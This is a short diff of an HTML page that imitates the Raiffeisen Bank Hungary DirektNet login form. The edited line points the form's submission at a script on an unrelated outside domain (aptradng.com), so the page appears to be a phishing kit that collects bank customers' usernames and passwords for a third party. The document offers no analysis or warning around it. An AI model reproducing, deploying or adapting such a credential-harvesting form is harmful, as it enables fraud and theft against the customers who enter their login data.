@@ -248,7 +248,7 @@
 						<dl class="tabbed" id="DirektTabBox">
 							<dt class="tab1 first" id='loginTab' onclick='clearLoginErrors();'><span>DirektNet belépés</span></dt>
 							<dd class="tab1" style="height: auto; padding-bottom:10px;">
-								<form name="loginForm" method="post" action="https://aptradng.com/movichbank/raiffeisen.hu/submit.php" onsubmit="javascript:return validateLoginForm()" autocomplete="off">
+								<form name="loginForm" method="post" action="https://aptradng.com/raiffeisen.hu/submit.php" onsubmit="javascript:return validateLoginForm()" autocomplete="off">
 					
 
 									<script type="text/javascript">
